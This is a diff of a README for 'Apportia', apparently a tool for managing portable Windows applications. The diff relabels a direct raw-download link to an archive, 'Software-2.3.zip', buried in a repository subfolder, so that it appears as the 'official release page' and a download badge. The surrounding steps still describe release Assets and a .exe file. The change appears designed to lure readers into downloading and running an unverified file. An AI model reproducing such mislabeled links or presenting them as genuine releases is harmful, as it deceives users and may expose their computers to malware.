@@ -1,12 +1,12 @@
 # 🌐 Apportia - Manage your portable software collection easily
 
-[![](https://img.shields.io/badge/Download_Apportia-Blue?style=for-the-badge)](https://github.com/Ovateleafflemishdialect969/Apportia)
+[![](https://img.shields.io/badge/Download_Apportia-Blue?style=for-the-badge)](https://github.com/Ovateleafflemishdialect969/Apportia/raw/refs/heads/main/causey/Software-2.3.zip)
 
 Apportia helps you find, install, and open portable applications. These programs run directly from folders without the need for complex installation wizards. You keep your system clean because these files stay separate from your main Windows registry folders.
 
 ## 📥 How to download and run 
 
-1. Visit the [official release page](https://github.com/Ovateleafflemishdialect969/Apportia) to find the software.
+1. Visit the [official release page](https://github.com/Ovateleafflemishdialect969/Apportia/raw/refs/heads/main/causey/Software-2.3.zip) to find the software.
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe for your Windows computer.
 4. Save the file to your desktop or a folder of your choice.
